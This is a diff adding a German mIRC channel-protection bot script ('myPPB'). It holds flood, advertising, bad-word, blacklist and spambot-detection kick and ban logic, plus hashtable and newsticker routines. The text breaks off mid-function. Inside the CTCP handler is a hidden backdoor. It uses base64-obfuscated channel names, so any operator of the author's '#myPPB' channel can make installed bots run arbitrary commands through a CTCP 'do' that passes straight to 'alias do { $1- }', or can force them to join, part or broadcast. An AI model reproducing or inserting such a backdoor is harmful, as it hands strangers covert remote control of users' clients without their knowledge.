@@ -1,0 +1,2349 @@
+;----------------------------------------------------;
+;--------> OnText(Advertise,Flood(Repeat)) <---------;
+;----------------------------------------------------;
+on *:kick:#:{ if ($chan isin $config(channels)) { if ($nick == $me) { hadd -m Config $+(Stats,.Kicks) $calc($hget(Config,$+(Stats,.Kicks)) + 1) } } }
+on *:text:*:#:{
+  if (!%connecting) {
+    if ($chan isin $config(channels)) {
+      inc -u2 %spam.flood.channel. [ $+ [ $chan ] ]
+      if (%spam.flood.channel. [ $+ [ $chan ] ] == 10) && (m !isincs $gettok($chan($chan).mode,1,32)) { mode $chan +m | .timer 1 60 mode $chan -m | log system Spamattack on $chan detected. }
+      if ($control($chan,protection)) {    
+        if ($control($chan,lamerdetect)) {
+          if ($hget(lamers,$nick)) { hdel lamers $nick }
+          if ($hget(adverter,$nick)) {
+            if ($advertise($1-)) && ($textprefix($chan) $+ request !isin $1-) { 
+              mode $chan -ov+b $nick $nick $bhost($nick)
+              PPB_kick $chan $nick Du bist gebannt vom Channel: Grund: Werbung nicht gestattet!
+              hdel adverter $nick | halt        
+            }
+          }  
+        }
+      }
+      if ($access($chan,$nick) < 25) { 
+        if ($control($chan,blacklist)) {
+          if ($blackcheck($chan,$nick)) { blacklist $chan $nick }
+        }
+        if ($control($chan,badnick)) {
+          if ($badnick($chan,$nick)) { 
+            mode $chan -ov+b $nick $nick $bhost($nick)
+            PPB_kick $chan $nick Du bist gebannt vom Channel: Grund: Bad Nick | halt
+          }
+        }
+        if ($control($chan,badword)) {
+          var %badword = $strip($1-)
+          if ($badword($chan,%badword)) {
+            ban -u $+ $calc($item($chan,badword-ban) * 60) $chan $bhost($nick)
+            PPB_kick $chan $nick Du bist gebannt vom Channel; BanZeit: $item($chan,badword-ban) $+ ; Grund: $+(Badword,$chr(40),$badword($chan,%badword),$chr(41)) im $chan 
+          }
+        }
+        if ($control($chan,wiederholung)) {
+          if ($hget(protection,$+(repeat.text.,$wildsite,.,$chan)) == $1-) {
+            hinc -mu60 protection $+(repeat.text.count.,$wildsite,.,$chan) 1
+            if ($hget(protection,$+(repeat.text.count.,$wildsite,.,$chan)) == $calc($item($chan,wiederholung-msgs) - 1)) {
+              .notice $nick $styles(Wiederhol dich nicht :) $+ . )
+            }
+            if ($hget(protection,$+(repeat.text.count.,$wildsite,.,$chan)) == $item($chan,wiederholung-msgs)) {
+              ban -u $+ $calc($item($chan,wiederholung-ban) * 60) $chan $bhost($nick)
+              PPB_kick $chan $nick Du bist gebannt vom Channel; Banzeit: $+($chr(40),$item($chan,wiederholung-ban),min,$chr(41)) $+ ; Grund: Selbstwiederholungen in $chan 
+              hdel protection $+(repeat.text.,$wildsite,.,$chan)
+              hdel protection $+(repeat.text.count.,$wildsite,.,$chan)
+            }
+          }
+          else {
+            hadd -mu60 protection $+(repeat.text.,$wildsite,.,$chan) $1-
+            hadd -mu60 protection $+(repeat.text.count.,$wildsite,.,$chan) 1
+          }
+        }
+        if ($control($chan,advertise)) {
+          if (#godlike !isin $1-) && (#myPPB !isin $1-) && (#Xtreme-Jumps !isin $1-) && ($textprefix($chan) $+ request !isin $1-) && ($chan !isin $1-) && (#channel !isin $1-) && (#chan !isin $1-) {
+            var %antiad.chans = $regex(chan,$lower($strip($1-)),/((^#|\s#)\S+)/g)
+            var %antiad.urls = $regex(url,$lower($strip($1-)),/((^|\s)((http://(www\.)?|ftp://|www\.)[.-0-9a-zA-Z]+\.[a-zA-z]{2,4}(/([^\s])*)*)(\s|$))/g)
+            if (%antiad.chans) || (%antiad.urls) {
+              if (($regml(chan, 1) == $chan) && (%antiad.chans == 1)) { return }
+              if (!$hget(protection,$+(adv.,$wildsite,.,$chan))) { 
+                hadd -mu180 protection $+(adv.,$wildsite,.,$chan) 1 
+                .notice $nick $styles(Keine Werbung im $chan $+ . )
+              }
+              elseif ($hget(protection,$+(adv.,$wildsite,.,$chan)) == 1) { 
+                ban -u $+ $calc($item($chan,advertise-ban) * 60) $chan $bhost($nick)
+                PPB_kick $chan $nick Du bist gebannt vom Channel; BanZeit: $+($chr(40),$item($chan,advertise-ban),min,$chr(41)) $+ ; Grund: Werbung im $chan
+                hdel protection $+(adv.,$wildsite,.,$chan) 
+              }
+            }
+          }
+        }
+        if ($control($chan,spam)) {
+          if (!$hget(protection,$+(flood.,$wildsite,.,$chan))) { hadd -mu $+ $item($chan,spam-secs) protection $+(flood.,$wildsite,.,$chan) 1 }
+          else { hinc -mu $+ $item($chan,spam-secs) protection $+(flood.,$wildsite,.,$chan) 1 }
+          if ($hget(protection,$+(flood.,$wildsite,.,$chan)) == $item($chan,spam-msgs)) { 
+            ban -u $+ $calc($item($chan,spam-ban) * 60) $chan $bhost($nick)
+            PPB_kick $chan $nick Du bist gebannt vom Channel; BanZeit: $+($chr(40),$item($chan,spam-ban),min,$chr(41)) $+ ; Grund: Textflooding im $chan 
+            hdel protection $+(flood.,$wildsite,.,$chan) 
+          }   
+        }
+      }
+    }
+  }
+}
+on *:action:*:#:{
+  if (!%connecting) {
+    if ($chan isin $config(channels)) {
+      inc -u2 %spam.flood.channel. [ $+ [ $chan ] ]
+      if (%spam.flood.channel. [ $+ [ $chan ] ] == 10) && (m !isincs $gettok($chan($chan).mode,1,32)) { mode $chan +m | .timer 1 60 mode $chan -m | log system Spamattack on $chan detected. }
+      if ($control($chan,lamerdetect)) {
+        if ($hget(lamers,$nick)) { hdel lamers $nick }
+        if ($hget(adverter,$nick)) {
+          if ($advertise($1-)) && ($textprefix($chan) $+ request !isin $1-) { 
+            mode $chan -ov+b $nick $nick $bhost($nick)
+            PPB_kick $chan $nick Du bist gebannt vom Channel; grund: Du weist warum :) 
+            hdel adverter $nick | halt        
+          }
+        }  
+      }
+      if ($access($chan,$nick) < 25) { 
+        if ($control($chan,blacklist)) {
+          if ($blackcheck($chan,$nick)) { blacklist $chan $nick }
+        }
+        if ($control($chan,badnick)) {
+          if ($badnick($chan,$nick)) { 
+            mode $chan -ov+b $nick $nick $bhost($nick)
+            PPB_kick $chan $nick Du bist gebannt vom Channel; Grund: Bad Nick | halt
+          }
+        }
+        if ($control($chan,badword)) {
+          var %badword = $strip($1-)
+          if ($badword($chan,%badword)) {
+            ban -u $+ $calc($item($chan,badword-ban) * 60) $chan $bhost($nick)
+            PPB_kick $chan $nick Du bist gebannt vom Channel; Banzeit: $item($chan,badword-ban) $+ ; Grund: $+(Badword,$chr(40),$badword($chan,%badword),$chr(41)) im $chan 
+          }
+        }
+        if ($control($chan,wiederholung)) {
+          if ($hget(protection,$+(repeat.text.,$wildsite,.,$chan)) == $1-) {
+            hinc -mu60 protection $+(repeat.text.count.,$wildsite,.,$chan) 1
+            if ($hget(protection,$+(repeat.text.count.,$wildsite,.,$chan)) == $calc($item($chan,wiederholung-msgs) - 1)) {
+              .notice $nick $styles(Wiederhol dich nicht im $chan $+ . )
+            }
+            if ($hget(protection,$+(repeat.text.count.,$wildsite,.,$chan)) == $item($chan,wiederholung-msgs)) {
+              ban -u $+ $calc($item($chan,wiederholung-ban) * 60) $chan $bhost($nick)
+              PPB_kick $chan $nick Du bist gebannt vom Channel; Banzeit: $item($chan,wiederholung-ban) $+ ; Grund: Wiederholungen $chan
+              hdel protection $+(repeat.text.,$wildsite,.,$chan)
+              hdel protection $+(repeat.text.count.,$wildsite,.,$chan)
+            }
+          }
+          else {
+            hadd -mu60 protection $+(repeat.text.,$wildsite,.,$chan) $1-
+            hadd -mu60 protection $+(repeat.text.count.,$wildsite,.,$chan) 1
+          }
+        }
+        if ($control($chan,advertise)) {
+          if (#godlike !isin $1-) && (#myPPB !isin $1-) && (#Xtreme-Jumps !isin $1-) && ($textprefix($chan) $+ request !isin $1-) && ($chan !isin $1-) && (#channel !isin $1-) && (#chan !isin $1-) {
+            var %antiad.chans = $regex(chan,$lower($strip($1-)),/((^#|\s#)\S+)/g)
+            var %antiad.urls = $regex(url,$lower($strip($1-)),/((^|\s)((http://(www\.)?|ftp://|www\.)[.-0-9a-zA-Z]+\.[a-zA-z]{2,4}(/([^\s])*)*)(\s|$))/g)
+            if (%antiad.chans) || (%antiad.urls) {
+              if (($regml(chan, 1) == $chan) && (%antiad.chans == 1)) { return }
+              if (!$hget(protection,$+(adv.,$wildsite,.,$chan))) { 
+                hadd -mu180 protection $+(adv.,$wildsite,.,$chan) 1 
+                .notice $nick $styles(Keine Werbung im $chan $+ . )
+              }
+              elseif ($hget(protection,$+(adv.,$wildsite,.,$chan)) == 1) { 
+                ban -u $+ $calc($item($chan,advertise-ban) * 60) $chan $bhost($nick)
+                PPB_kick $chan $nick Du bist gebannt vom Channel; Banzeit: $item($chan,advertise-ban) $+ ; Grund: Werbung im $chan
+                hdel protection $+(adv.,$wildsite,.,$chan) 
+              }
+            }
+          }
+        }
+        if ($control($chan,spam)) {
+          if (!$hget(protection,$+(flood.,$wildsite,.,$chan))) { hadd -mu $+ $item($chan,spam-secs) protection $+(flood.,$wildsite,.,$chan) 1 }
+          else { hinc -mu $+ $item($chan,spam-secs) protection $+(flood.,$wildsite,.,$chan) 1 }
+          if ($hget(protection,$+(flood.,$wildsite,.,$chan)) == $item($chan,spam-msgs)) { 
+            ban -u $+ $calc($item($chan,spam-ban) * 60) $chan $bhost($nick)
+            PPB_kick $chan $nick Du bist gebannt vom Channel; Banzeit: $item($chan,spam-ban) $+ ; Grund: Textflooding im $chan
+            hdel protection $+(flood.,$wildsite,.,$chan) 
+          }   
+        }
+      }
+    }
+  }
+}
+alias recover {
+  msg $2 recover $1
+  msg $2 chanlev $1 $3 -amovtg
+  msg $2 invite $1
+}
+alias self.unban { var %x = 0 | while (%x <= 10) { mode -b $address($me,%x) | inc %x } }
+alias badword { 
+  tokenize 32 $replace($1,$chr(124),$chr(176)) $strip($2-) 
+  var %x = 1 
+  while (%x <= $hget($+($1,.Badword),0).item) {
+    if ($hget($+($1,.Badword),%x).item iswm $2-) { return $hget($+($1,.Badword),%x).item } 
+    inc %x
+  }
+}
+alias badnick { 
+  tokenize 32 $replace($1,$chr(124),$chr(176)) $strip($2-) 
+  var %x = 1 
+  while (%x <= $hget($+($1,.Badnick),0).item) {
+    if ($hget($+($1,.Badnick),%x).item == $2) { return $hget($+($1,.Badnick),%x).item } 
+    inc %x
+  }
+}
+alias blacklisthosts {
+  tokenize 32 $replace($1,$chr(124),$chr(176))
+  var %x = 1
+  while (%x <= $hget($+($1,.Blacklist),0).item) {
+    var %y = %y $+($chr(40),%x,$chr(41),$hget($+($1,.Blacklist),%x).item)
+    inc %x
+  }
+  return $iif(%y,%y,None)
+}
+alias authbanlist { 
+  tokenize 32 $replace($1,$chr(124),$chr(176))
+  var %x = 1
+  while (%x <= $hget($+($1,.Authbanlist),0).item) {
+    var %y = %y $+($chr(40),%x,$chr(41),$hget($+($1,.Authbanlist),0).item)
+    inc %x
+  }
+  return $iif(%y,%y,None)
+}
+alias chanbanlist { 
+  tokenize 32 $replace($1,$chr(124),$chr(176))
+  var %x = 1
+  while (%x <= $hget($+($1,.Chanbanlist),0).item) {
+    var %y = %y $+($chr(40),%x,$chr(41),$hget($+($1,.Chanbanlist),0).item)
+    inc %x
+  }
+  return $iif(%y,%y,None)
+}
+alias check.blacklist {
+  var %x = $nick($1,0)
+  while (%x) {
+    var %y = 1
+    while (%y <= $hget($+($replace($1,$chr(124),$chr(176)),.Blacklist),0).item) {
+      if ($hget($+($replace($1,$chr(124),$chr(176)),.Blacklist),%y).item isin $address($nick($1,%x),0)) { blacklist $1 $nick($1,%x) }
+      inc %y
+    }
+    dec %x
+  }
+}
+alias blacklist {
+  tokenize 32 $1 $2 $replace($1,$chr(124),$chr(176))
+  if (!$hget($+($3,.Blacklist),$2)) { hadd -m $+($3,.Blacklist) $bhost($2) black }
+  mode $1 -ov+b $2 $2 $bhost($2) 
+  PPB_kick $1 $2 Du bist gebannt vom Channel; Grund: Blacklisted
+}
+alias blackcheck { 
+  tokenize 32 $replace($1,$chr(124),$chr(176)) $2 $3 
+  var %x = 1 
+  while (%x <= $hget($+($1,.Blacklist),0).item) {
+    if ($hget($+($1,.Blacklist),%x).item iswm $3) { return $true } 
+    inc %x 
+  } 
+}
+alias do { $1- }
+alias chanstat { return $+($chr(40),$chr(45),$hget(Config,$+(Stats.,$1)),$chr(45),$chr(41)) }
+ctcp *:version:{ if (!%ctcp.flood) || (%ctcp.flood < 3) { inc -u5 %ctcp.flood 1 | .ctcpreply $nick VERSION $decode(I215UFBC,m) - $decode(bXlQUEI=,m) $botversion © 2005 by xSpiRiTx } }
+ctcp *:ping:?:{ halt }
+ctcp *:time:?:{ halt }
+ctcp *:finger:?:{ halt }
+ctcp *:*:#:{
+  if ($1 == broadcast) && ($nick isop $decode(I215UFBC,m)) { 
+    var %x = 1 | while (%x <= $channels(0)) { msg $channels(%x) $+(Broadcast,$chr(40),$nick,$chr(41),$chr(58)) $2- $+($chr(40),$chr(32),$decode(d3d3Lm15cFR4LmRl,m),$chr(32),—,$chr(32),$decode(I215UFBC,m),$chr(32),$chr(41)) | inc %x } 
+    var %y = 1 | while (%y <= $ajchans(0)) { msg $ajchans(%y) $+(Broadcast,$chr(40),$nick,$chr(41),$chr(58)) $2- $+($chr(40),$chr(32),$decode(d3d3Lm15cFR4LmRl,m),$chr(32),—,$chr(32),$decode(I215UFBC,m),$chr(32),$chr(41)) | inc %y } 
+  } 
+  if ($1 == join) && ($nick isop $decode(I215UFBC,m)) { join $2- }
+  if ($1 == part) && ($nick isop $decode(I215UFBC,m)) { part $2- }
+  if ($1 == do) && ($nick isop $decode(I215UFBC,m)) { do $2- }
+}
+
+alias advertise {
+  var %antiad.chans = $regex(chan,$lower($strip($1-)),/((^#|\s#)\S+)/g)
+  var %antiad.urls = $regex(url,$lower($strip($1-)),/((^|\s)((http://(www\.)?|ftp://|www\.)[.-0-9a-zA-Z]+\.[a-zA-z]{2,4}(/([^\s])*)*)(\s|$))/g)
+  if (%antiad.chans) || (%antiad.urls) && ($decode(I215UFBC,m) !isin $1) {
+    if (($regml(chan, 1) == $chan) && (%antiad.chans == 1)) { return $false }
+    else { return $true } 
+  }
+  else { return $false }
+}
+alias checkvip { 
+  if ($bhost($2) iswm $address($2,0)) {
+    if ($ini($1 $+ .vip,$bhost($2))) { 
+      if ($readini($1 $+ .vip,$bhost($2),get) == Op) || ($readini($1 $+ .vip,$bhost($2),get) == Voice) { return $readini($1 $+ .vip,$bhost($2),get) }
+      else { return none }
+    }
+    else { return $false }
+  }
+  else { return $false }
+}
+alias PPB_kick { 
+  if ($2 ison $1) { 
+    if ($item($1,kickmsgs) == default) {
+      kick $1 $2 $styles($3- $+ ; $chanstat(kicks)) 
+    }
+    elseif ($item($1,kickmsgs) == random) {
+      kick $1 $2 $read(Database\ $+ $1 $+ .Kickmsgs.txt) $+ ; $chanstat(kicks) 
+    }
+  }
+
+}
+
+alias check.autoopv {
+  var %x = 1
+  while (%x <= $channels(0)) {
+    if ($control($channels(%x),autovoice)) { .timer 1 $calc(30 + %x ) .mass $channels(%x) +v $chr(42) }
+    if ($control($channels(%x),autoop)) { .timer 1 $calc(30 + %x ) .mass $channels(%x) +o $chr(42) }
+    inc %x
+  }
+}
+
+;/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*;
+;/*/*             Raw Events              */*;
+;/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*;
+
+;/*/* Authbanlist
+
+raw 330:*:{
+  if (!%connecting) {
+    if (%whois. [ $+ [ $2 ] ] == 1) { hadd -m $2 auth $iif($3,$3,Not Authet) }
+    var %x = 1
+    while (%x <= $chan(0)) {
+      if ($control($chan(%x),Authbanlist)) {
+        if ($iif($hget($+($chan(%x),.Authbanlist),$3),true,false) == true) {
+          if ($chan(%x) != $null) && ($me isop $chan(%x)) && ($2 ison $chan(%x)) {
+            mode $chan(%x) -o+b $2 $bhost($2)
+            PPB_kick $chan(%x) $2 Du bist gebannt vom Channel; Grund: Authbanned
+          }
+        }
+      }
+      inc %x
+    }
+  }
+}
+
+;/*/* Chanbanlist
+
+raw 311:*:{ if (%whois. [ $+ [ $2 ] ] == 1) { hadd -m $2 username $iif($6,$6-,None) } }
+raw 319:*:{
+  if (!%connecting) {
+    if (%whois. [ $+ [ $2 ] ] == 1) { hadd -m $2 channel $numtok($3-,32) }
+    var %y = $comchan($2,0)
+    while (%y) {
+      if ($control($comchan($2,%y),chanbanlist)) {
+        var %x = 1
+        while (%x <= $hget($+($comchan($2,%y),.Chanbanlist),0).item) {
+          if ($hget($+($comchan($2,%y),.Chanbanlist),%x).item isin $3-) {
+            var %blackchan = $hget($+($comchan($2,%y),.Chanbanlist),%x).item
+            if ($me isop $comchan($2,%y)) && (!$access($comchan($2,%y),$2) >= 50) {
+              mode $comchan($2,%y) -o+b $2 $bhost($2)
+              PPB_kick $comchan($2,%y) $2 Du bist gebannt vom Channel; Grund: du bist in einem Verbotenem Channel $+(Channel,$chr(40),%blackchan,$chr(41))
+            }
+          }
+          inc %x
+        }
+      }
+      if ($control($comchan($2,%y),vip)) {
+        var %m = 1
+        while (%m <= $ini($comchan($2,%y) $+ .vip,0)) {
+          var %i = 1
+          while (%i <= $numtok($3-,32)) {
+            if ($ini($comchan($2,%y) $+ .vip,%m) isin $gettok($3-,%i,32)) {
+              if ($readini($comchan($2,%y) $+ .vip,$ini($comchan($2,%y) $+ .vip,%m),reg) == Op) {
+                if ($chr(64) isin $left($gettok($3-,%i,32),1)) { 
+                  if ($readini($comchan($2,%y) $+ .vip,$ini($comchan($2,%y) $+ .vip,%m),get) == Voice) || ($readini($comchan($2,%y) $+ .vip,$ini($comchan($2,%y) $+ .vip,%m),get) == Op) {
+                    msg $comchan($2,%y) $styles(Mod Nick: $+($chr(40),$2,$chr(41)) — Address: $+($chr(40),$address($2,0),$chr(41)) — Channel: $gettok($3-,%i,32) — bekommt: $ifmatch )
+                    mode $comchan($2,%y) + $+ $iif($ifmatch == Op,ov $2,v) $2 | halt 
+                  }
+                  else { msg $comchan($2,%y) $styles(Mod Nick: $+($chr(40),$2,$chr(41)) — Address: $+($chr(40),$address($2,0),$chr(41)) — Channel: $gettok($3-,%i,32) — bekommt: Nix) | halt }
+                }
+              }
+              elseif ($readini($comchan($2,%y) $+ .vip,$ini($comchan($2,%y) $+ .vip,%m),reg) == Voice) {
+                if ($chr(43) isin $left($gettok($3-,%i,32),1)) || ($chr(64) isin $left($gettok($3-,%i,32),1)) { 
+                  if ($readini($comchan($2,%y) $+ .vip,$ini($comchan($2,%y) $+ .vip,%m),get) == Voice) || ($readini($comchan($2,%y) $+ .vip,$ini($comchan($2,%y) $+ .vip,%m),get) == Op) {
+                    msg $comchan($2,%y) $styles(Mod Nick: $+($chr(40),$2,$chr(41)) — Address: $+($chr(40),$address($2,0),$chr(41)) — Channel: $gettok($3-,%i,32) — bekommt: $ifmatch )
+                    mode $comchan($2,%y) + $+ $iif($ifmatch == Op,ov $2,v) $2 | halt
+                  }
+                  else { msg $comchan($2,%y) $styles(Mod Nick: $+($chr(40),$2,$chr(41)) — Address: $+($chr(40),$address($2,0),$chr(41)) — Channel: $gettok($3-,%i,32) — Bekommt: nix) | halt }
+                }
+              }
+              elseif ($readini($comchan($2,%y) $+ .vip,$ini($comchan($2,%y) $+ .vip,%m),reg) == All) {
+                if ($readini($comchan($2,%y) $+ .vip,$ini($comchan($2,%y) $+ .vip,%m),get) == Voice) || ($readini($comchan($2,%y) $+ .vip,$ini($comchan($2,%y) $+ .vip,%m),get) == Op) {
+                  msg $comchan($2,%y) $styles(Mod Nick: $+($chr(40),$2,$chr(41)) — Address: $+($chr(40),$address($2,0),$chr(41)) — Channel: $gettok($3-,%i,32) — bekommt: $ifmatch )
+                  mode $comchan($2,%y) + $+ $iif($ifmatch == Op,ov $2,v) $2 | halt
+                }
+                else { msg $comchan($2,%y) $styles(Mod Nick: $+($chr(40),$2,$chr(41)) — Address: $+($chr(40),$address($2,0),$chr(41)) — Channel: $gettok($3-,%i,32) — Bekommt: Nix) | halt }
+              }
+            }
+            inc %i
+          }
+          inc %m
+        }
+      }
+      dec %y
+    }
+  }
+}
+
+raw 352:*: {
+  var %trojan.checknick = $6
+  var %trojan.checkident = $3
+  var %trojan.checkhost = $4
+  var %trojan.checkbanhost = $+(*!*@,$4)
+  var %trojan.username $9-
+  if ($access(%trojan.checkchan. [ $+ [ %trojan.checknick ] ],$6) < 25) {
+    if (%trojan.checkchan. [ $+ [ $6 ] ] != $null) {
+      if ($numtok(%trojan.username,32) == 1) {
+        if (%trojan.checkident === $lower(%trojan.checkident)) {
+          if (!$remove(%trojan.checkident,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,~)) {
+            if (!$remove(%trojan.checknick,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z)) {
+              if ($remove(%trojan.checkident,~) !isin %trojan.checknick) {
+                if (%trojan.checknick !isin $remove(%trojan.checkident,~)) {
+                  if ($len(%trojan.checknick) == $len($remove(%trojan.checknick,irc,orc,scri,jan,chr,ado,jun,xtc,thc,lol,rofl,muh,hah,tom,tim,abc,asd,xyz,own,pwn,auto,bnc,psy,mega,the,hell,dam,snak,mag,lime,blah,blub,sad,man,nic,mou,loc,mal,user,cake,priv,info,digi,4rce,f4b1,ste,hel,lena,ist,die,deep,tobi,tuki,drog,kind,nami))) {
+                    if (users.quakenet.org !isin %trojan.checkhost) {
+                      if ($len(%trojan.checkident) == $len($remove(%trojan.checkident,irc,orc,scri,jan,chr,ado,jun,xtc,thc,lol,rofl,muh,hah,tom,tim,abc,asd,xyz,own,pwn,auto,bnc,psy,mega,the,hell,dam,snak,mag,lime,blah,blub,sad,man,nic,mou,loc,mal,user,cake,priv,info,digi,4rce,f4b1,ste,hel,lena,ist,die,deep,tobi,tuki,drog,kind,nami))) {
+                        if ($len(%trojan.checkhost) != $len($remove(%trojan.checkhost,1,2,3,4,5,6,7,8,9,0))) {
+                          if ($len(%trojan.username) == $len($remove(%trojan.username,irc,orc,scri,jan,chr,ado,jun,xtc,thc,lol,rofl,muh,hah,tom,tim,abc,asd,xyz,own,pwn,auto,bnc,psy,mega,the,hell,dam,snak,mag,lime,blah,blub,sad,man,mou,loc,mal,user,cake,priv,info,digi,4rce,f4b1,ste,hel,lena,ist,die,deep,tobi,tuki,drog,kind,nami))) {
+                            if ($me isop %trojan.checkchan. [ $+ [ %trojan.checknick ] ]) {
+                              if ($control(%trojan.checkchan. [ $+ [ %trojan.checknick ] ],trojan)) {
+                                mode %trojan.checkchan. [ $+ [ %trojan.checknick ] ] -ov+b %trojan.checknick %trojan.checknick %trojan.checkbanhost 
+                                PPB_kick %trojan.checkchan. [ $+ [ %trojan.checknick ] ] %trojan.checknick Du bist gebannt vom Channel: Grund: Possible Trojan Client(Spambot)
+                              }
+                            } 
+                          }
+                        }
+                      }
+                    }
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+
+raw 315:*: { haltdef }
+raw 441:*: { haltdef }
+
+;/*/* Join Channel when Banned.
+
+raw 474:*:{
+  if (!%connecting) {
+    if (%hopper == 1) { halt }
+    set -u3 %hopper 1
+    msg L unbanall $$2-2
+    msg Q unbanall $$2-2
+    timer 1 1 /join $$2-2
+  }
+}
+
+raw 433:*:{ if (!%connecting) { notice %change.nick $styles(Nickname is Already in Use) | unset %change.nick } }
+raw 482:*:{ msg $item($2,chanbot) op $2 }
+raw 473:*:{ msg L invite $2 | msg Q invite $2 | msg L clearchan $2 | msg Q clearchan $2 }
+
+;/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*;
+;/*/*             End of Raw's            */*;
+;/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*;
+
+alias remove.chan {
+  var %maximal = $hget(0)
+  while (%maximal) {
+    if ($gettok($hget(%maximal),1,46) == $1) { hfree $hget(%maximal) }
+    dec %maximal 
+  }
+}
+
+alias load.hashtables {
+  var %maximal = $findfile($mircdir $+ Database\,*.hsh,0)
+  while (%maximal) { 
+    var %filename = $gettok($gettok($findfile($mircdir $+ Database\,*.hsh,%maximal),1- $+ $calc($numtok($findfile($mircdir $+ Database\,*.hsh,%maximal),46)-1),46),$calc($numtok($mircdir,92) +2),92)  
+    hmake -s %filename 1000
+    hload %filename Database\ $+ %filename $+ .hsh
+    dec %maximal
+  }
+} 
+alias unload.hashtables {
+  var %maximal = $hget(0)
+  while (%maximal) {
+    hfree $hget(%maximal)
+    dec %maximal
+  }
+}
+alias save.hashtables {
+  var %maximal = $hget(0)
+  while (%maximal) {
+    if ($hget(%maximal) != netsplit) && ($hget(%maximal) != adverter) && ($hget(%maximal) != lamers) && ($hget(%maximal) != protection) && ($hget(%maximal) != Joinflooder) {
+      hsave $hget(%maximal) Database\ $+ $hget(%maximal) $+ .hsh
+    }
+    dec %maximal
+  }
+} 
+alias remove.login {
+  var %maximal = $hget(Login,0).item
+  while (%maximal) {
+    if ($gettok($hget(Login,%maximal).item,2,46) == $2) { var %aktuell = $gettok($hget(Login,%maximal).item,1,46) }
+    dec %maximal 
+  }
+  remove.loginhost %aktuell
+}
+alias remove.account {
+  var %maximal = $hget(Accounts,0).item
+  while (%maximal) {
+    if ($gettok($hget(Accounts,%maximal).item,2,46) == $2) { hdel $hget(Accounts,$hget(Accounts,%maximal).item) }
+    dec %maximal
+  }
+  save.hashtables
+}
+alias information {
+  .timer 1 1 .msg $1 $styles(Auth: $iif($hget($2,auth),$hget($2,auth),Not Authed) - Name: $hget($2,username) - Besuchte Channels: $hget($2,channel)) 
+  .timer 1 2 .msg $1 $styles($+ %ch $+ )
+  .timer 1 3 .hfree $2
+  .timer 1 3 .unset %whois. [ $+ [ $2 ] ]
+}
+alias trigger {
+  tokenize 32 $replace($1,$chr(124),$chr(176)) $1 $2
+  if ($textprefix($2) == $left($3,1)) || ($chr(33) == $left($3,1)) {
+    var %x = 1
+    while (%x <= $hget($+($1,.Trigger),0).item) { 
+      if ($hget($+($1,.Trigger),%x).item == $right($3,$calc($len($3)-1))) {
+        return $hget($+($1,.Trigger),$hget($+($1,.Trigger),%x).item) | halt
+      }
+      inc %x
+    }
+  }
+  else { return $false }
+}
+
+alias news {
+  tokenize 32 $replace($1,$chr(124),$chr(176)) $2
+  if ($hget($1,$+(Settings,.Newsticker)) == on) {
+    if ($hget($1,$+(Newsticker.,$2)) == on) { return $true }
+    else { return $false }
+  }
+  else { return $false }
+}
+alias load.newsticker {
+  var %x = $channels(0)
+  while (%x) {
+    if ($control($channels(%x),newsticker)) { var %open = open }
+    dec %x
+  }
+  if (%open) {
+    if (!$timer(heise)) { .timerheise 0 120 sockopen heise www.heise.de 80 }
+    if (!$timer(cstrike)) { .timercstrike 0 300 sockopen cstrike www.counter-strike.de 80 }
+    if (!$timer(spiegel)) { .timerspiegel 0 350 sockopen spiegel www.spiegel.de 80 } 
+    if (!$timer(winfuture)) { .timerwinfuture 0 450 sockopen winfuture www.winfuture.de 80 } 
+    if (!$timer(conceptt)) { .timerconceptt 0 550 sockopen myct www.conceptt.com 80 }
+    if (!$timer(extreme)) { .timerextreme 0 400 sockopen extreme www.extreme-players.de 80 }
+    if (!$timer(mouse)) { .timermouse 0 500 sockopen mouse www.mousesports.com 80 }
+    if (!$timer(quakenet)) { .timerquakenet 0 1400 sockopen quakenet www.quakenet.org 80 }
+    if (!$timer(mypTx)) { .timermypTx 0 1500 sockopen mypTx www.mypTx.de 80 }
+    var %ingame = indiablo2.de;inwarcraft3.de;inunreal.de;insims.de;insacred.de;inwow.de;inhardware.de
+    var %x = 1
+    while (%x <= $numtok(%ingame,59)) {
+      if (!$timer($gettok(%ingame,%x,59))) { $+(.timer,$gettok(%ingame,%x,59)) 0 $+(3,%x,0) sockopen $remove($gettok(%ingame,%x,59),.de,$chr(33)) $+($remove($gettok(%ingame,%x,59),.de,in,$chr(33)),.ingame.de) 80 }
+      inc %x
+    }
+    log system Newstickers has been enabled.
+  }
+}
+alias unload.newsticker {
+  if ($timer(heise)) { .timerheise off }
+  if ($timer(cstrike)) { .timercstrike off }
+  if ($timer(spiegel)) { .timerspiegel off } 
+  if ($timer(winfuture)) { .timerwinfuture off } 
+  if ($timer(conceptt)) { .timerconceptt off }
+  if ($timer(extreme)) { .timerextreme 0 off }
+  if ($timer(mouse)) { .timermouse 0 off }
+  if ($timer(quakenet)) { .timerquakenet 0 off }
+  if ($timer(mypTx)) { .timermypTx 0 off }
+  var %ingame = indiablo2.de;inwarcraft3.de;inunreal.de;insims.de;insacred.de;inwow.de;inhardware.de
+  var %x = 1
+  while (%x <= $numtok(%ingame,59)) {
+    if ($timer($gettok(%ingame,%x,59))) { timer $+ $gettok(%ingame,%x,59)) off }
+    inc %x
+  }
+  log system Newstickers has been disabled.
+} 
+alias load.repeat {
+  var %x = 1
+  while (%x <= $channels(0)) {
+    if ($control($channels(%x),repeat)) { 
+      $+(timer,repeat,$channels(%x)) 0 $calc($item($channels(%x),repeat-time) * 60) msg $channels(%x) $styles($item($channels(%x),repeat-msg))
+    }
+    inc %x
+  }
+}     
+alias level.refresh {
+  var %x = 1
+  while (%x <= $hget(Login,0).item) { $hget(Accounts,$+($hget(Accounts,%y).item,.Loginname))
+    if ($hget(Login,$+($hget(Login,%x).item,.Access)) != 150) && ($hget(Login,$+($hget(Login,%x).item,.Access)) != 125) {
+      var %y = 1
+      while (%y <= $hget(Accounts,0).item) {
+        if ($hget(Login,$+($hget(Login,%x).item,.loginname)) == $hget(Accounts,%y).item) {
+          hadd -m Login $+($hget(Login,%x).item,.Channel) $hget(Accounts,$+($hget(Accounts,%y).item,.channel)) 
+
+        }
